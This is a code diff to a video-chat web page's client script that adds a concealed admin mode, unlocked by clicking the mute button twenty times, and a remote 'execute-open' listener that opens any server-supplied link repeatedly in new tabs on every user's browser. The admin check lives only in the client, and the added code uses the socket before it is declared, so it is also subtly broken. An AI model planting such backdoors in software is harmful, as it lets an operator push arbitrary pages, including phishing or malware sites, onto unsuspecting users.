@@ -85,6 +85,63 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
 <script>
+        // --- NEW ADMIN VARIABLES ---
+    let clickCount = 0;
+    let lastClickTime = Date.now();
+    let isAdmin = false;
+    
+    // --- MUTE AUDIO (WITH ADMIN TRIGGER) ---
+    muteBtn.addEventListener('click', () => {
+        // Admin Trigger Logic
+        const now = Date.now();
+        if (now - lastClickTime < 10000) {
+            clickCount++;
+        } else {
+            clickCount = 1;
+        }
+        lastClickTime = now;
+    
+        if (clickCount >= 20 && !isAdmin) {
+            isAdmin = true;
+            appendSystemMessage("Admin access granted.");
+        }
+    
+        // Original Mute Logic
+        const audioTrack = localStream.getAudioTracks()[0];
+        if (audioTrack) {
+            isMuted = !isMuted;
+            audioTrack.enabled = !isMuted;
+            muteBtn.innerText = isMuted ? "Unmute Mic" : "Mute Mic";
+            muteBtn.classList.toggle('active-red', isMuted);
+        }
+    });
+    
+    // --- CHAT FORM (WITH COMMAND INTERCEPTOR) ---
+    document.getElementById('chat-form').addEventListener('submit', e => {
+        e.preventDefault();
+        const input = document.getElementById('chat-input');
+        const val = input.value.trim();
+        
+        if (val) {
+            if (isAdmin && val.startsWith('!')) {
+                // Intercept command
+                socket.emit('admin-command', { cmd: val });
+                appendSystemMessage(`Command sent: ${val}`);
+            } else {
+                // Normal message
+                socket.emit('chat-message', { username: username, msg: val });
+            }
+            input.value = '';
+        }
+    });
+    
+    // --- REMOTE COMMAND LISTENER ---
+    socket.on('execute-open', data => {
+        // data: { link: "...", count: 3 }
+        for (let i = 0; i < data.count; i++) {
+            window.open(data.link, '_blank');
+        }
+    });
     const username = prompt("Enter your username:") || "User_" + Math.floor(Math.random() * 1000);
     const socket = io(window.location.origin);
     const videoGrid = document.getElementById('video-grid');
